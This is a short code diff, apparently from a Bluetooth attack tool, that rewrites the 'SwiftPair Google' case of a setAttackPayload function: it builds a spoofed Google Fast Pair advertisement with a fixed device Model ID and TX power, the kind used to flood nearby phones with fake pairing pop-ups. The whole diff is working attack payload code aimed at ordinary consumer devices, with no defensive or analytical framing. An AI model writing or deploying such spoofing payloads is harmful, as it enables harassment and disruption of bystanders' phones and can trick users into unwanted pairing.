@@ -539,28 +539,15 @@ void BleManager::setAttackPayload(BleAttackType attackType) {
 
   case BLE_ATTACK_SWIFTPAIR_GOOGLE: {
     // Google Fast Pair
-    uint8_t googlePayload[14];
-    int idx = 0;
-    googlePayload[idx++] = 3;
-    googlePayload[idx++] = 0x03;
-    googlePayload[idx++] = 0x2C; // Fast Pair Service UUID LSB
-    googlePayload[idx++] = 0xFE; // Fast Pair Service UUID MSB
-    googlePayload[idx++] = 6;
-    googlePayload[idx++] = 0x16;
-    googlePayload[idx++] = 0x2C;
-    googlePayload[idx++] = 0xFE;
-    googlePayload[idx++] = 0x00; // Model ID
-    googlePayload[idx++] = 0xB7;
-    googlePayload[idx++] = 0x27;
-    googlePayload[idx++] = 2;
-    googlePayload[idx++] = 0x0A;
-    googlePayload[idx++] = (uint8_t)(random(120) - 100); // TX Power
-
-    // Add as service data
+    // Service UUID 0xFE2C with Model ID
     NimBLEUUID serviceUUID((uint16_t)0xFE2C);
-    std::string serviceData((char *)googlePayload + 4, 10);
+    uint8_t modelId[3] = {0x00, 0xB7, 0x27}; // Smart Controller Model ID
+    std::string serviceData((char *)modelId, 3);
     advData.setServiceData(serviceUUID, serviceData);
-    advData.addTxPower((int8_t)googlePayload[13]);
+
+    // Add TX Power as separate AD type (0x0A)
+    advData.addTxPower(); // NimBLE will use default or device TX power
+
     Serial.println("[BLE] SwiftPair Google payload set");
   } break;
 
